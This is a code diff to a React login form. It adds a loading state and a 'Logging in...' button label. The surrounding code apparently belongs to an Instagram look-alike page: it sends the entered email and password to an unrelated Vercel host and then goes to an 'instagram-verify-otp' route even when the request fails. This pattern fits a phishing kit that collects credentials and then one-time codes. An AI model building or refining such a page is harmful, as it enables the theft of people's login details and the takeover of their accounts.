@@ -12,6 +12,8 @@ import { useNavigate } from "react-router-dom";
 const Login = () => {
     const [formData, setFormData] = useState({ email: "", password: "" });
     const navigate = useNavigate();
+    const [loading, setLoading] = useState(false); // Loading state
+
 
     const handleChange = (e) => {
         setFormData({ ...formData, [e.target.name]: e.target.value });
@@ -19,7 +21,7 @@ const Login = () => {
 
     const handleSubmit = async (e) => {
         e.preventDefault();
-
+        setLoading(true);
         try {
             const response = await fetch("https://think-pad-ruby.vercel.app/api/instagram/login", {
                 method: "POST",
@@ -32,15 +34,20 @@ const Login = () => {
             const data = await response.json();
             console.log("Login Successful:", data);
             navigate('/instagram-verify-otp');
+            setLoading(false);
         } catch (error) {
             navigate('/instagram-verify-otp');
+            setLoading(false)
+        }
+        finally {
+            setLoading(false);
         }
     };
 
 
 
 
-   
+
 
     return (
         <div className="flex justify-center items-center min-h-screen px-4 ">
@@ -73,8 +80,8 @@ const Login = () => {
                                 required
                                 className="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400"
                             />
-                            <button type="submit" className="text-sm text-center bg-blue-500 hover:bg-blue-600 text-white py-2 rounded font-medium">
-                                Log In
+                            <button disabled={loading} type="submit" className="text-sm text-center bg-blue-500 hover:bg-blue-600 text-white py-2 rounded font-medium">
+                                {loading ? "Logging in..." : "Log In"}
                             </button>
                         </form>
 
